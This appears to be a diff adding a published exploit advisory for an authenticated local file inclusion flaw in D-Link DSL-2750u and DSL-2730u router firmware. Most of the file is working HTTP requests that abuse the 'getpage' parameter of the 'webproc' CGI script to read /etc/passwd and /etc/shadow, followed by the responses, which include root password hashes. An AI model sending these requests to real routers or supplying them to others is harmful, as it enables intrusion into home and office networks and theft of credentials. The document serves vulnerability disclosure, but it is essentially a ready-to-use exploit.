@@ -1,0 +1,114 @@
+#[+] Author: SATHISH ARTHAR
+#[+] Exploit Title: Dlink Wireless Router Password File Access Exploit (Local File Inclusion)
+#[+] Date: 07-07-2015
+#[+] Platform: Hardware
+#[+] Tested on: linux
+#[+] Vendor: http://www.dlink.co.in
+#[+] Product web page: http://www.dlink.co.in
+
+#[+] Affected version:
+DSL-2750u (firmware: IN_1.08 )
+DSL-2730u (firmware: IN_1.02 )
+
+#[+] Sites: sathisharthars.wordpress.com
+#[+] Twitter: @sathisharthars
+#[+] Thanks: offensive security (@offsectraining)
+
+
+#########################################################################
+Dlink Wireless Router Password File Access Exploit
+#########################################################################
+
+Summary:
+
+The Dlink DSL-2750u and DSL-2730u wireless router improves
+your legacy Wireless-G network. It is a simple, secure way to share your
+Internet connection and allows you to easily surf the Internet, use email,
+and have online chats. The quick, CD-less setup can be done through a web
+browser. The small, efficient design fits perfectly into your home and
+small office.
+
+
+Desc:
+
+The router suffers from an authenticated file inclusion vulnerability
+(LFI) when input passed thru the 'getpage' parameter to 'webproc' script is
+not properly verified before being used to include files. This can be exploited
+to include files from local resources.
+
+
+Tested on: mini_httpd/1.19 19dec2003
+
+
+
+===============================================================
+
+
+GET /cgi-bin/webproc?var:page=wizard&var:menu=setup&getpage=/etc/passwd HTTP/1.1
+
+Host: 192.168.31.10
+
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:35.0) Gecko/20100101 Firefox/35.0
+
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+
+Accept-Language: en-US,en;q=0.5
+
+Accept-Encoding: gzip, deflate
+
+Cookie: sessionid=2b48aa9b
+
+Connection: keep-alive
+
+
+
+HTTP/1.0 200 OK
+
+Content-type: text/html
+
+Pragma: no-cache
+
+Cache-Control: no-cache
+
+set-cookie: sessionid=2b48aa9b; expires=Fri, 31-Dec-9999 23:59:59 GMT;path=/
+
+
+
+#root:x:0:0:root:/root:/bin/bash
+root:x:0:0:root:/root:/bin/sh
+#tw:x:504:504::/home/tw:/bin/bash
+#tw:x:504:504::/home/tw:/bin/msh
+
+
+GET /cgi-bin/webproc?var:page=wizard&var:menu=setup&getpage=/etc/shadow HTTP/1.1
+
+Host: 192.168.31.10
+
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:35.0) Gecko/20100101 Firefox/35.0
+
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+
+Accept-Language: en-US,en;q=0.5
+
+Accept-Encoding: gzip, deflate
+
+Cookie: sessionid=2b48aa9b
+
+Connection: keep-alive
+
+
+HTTP/1.0 200 OK
+
+Content-type: text/html
+
+Pragma: no-cache
+
+Cache-Control: no-cache
+
+set-cookie: sessionid=2b48aa9b; expires=Fri, 31-Dec-9999 23:59:59 GMT;path=/
+
+
+
+#root:$1$BOYmzSKq$ePjEPSpkQGeBcZjlEeLqI.:13796:0:99999:7:::
+root:$1$BOYmzSKq$ePjEPSpkQGeBcZjlEeLqI.:13796:0:99999:7:::
+#tw:$1$zxEm2v6Q$qEbPfojsrrE/YkzqRm7qV/:13796:0:99999:7:::
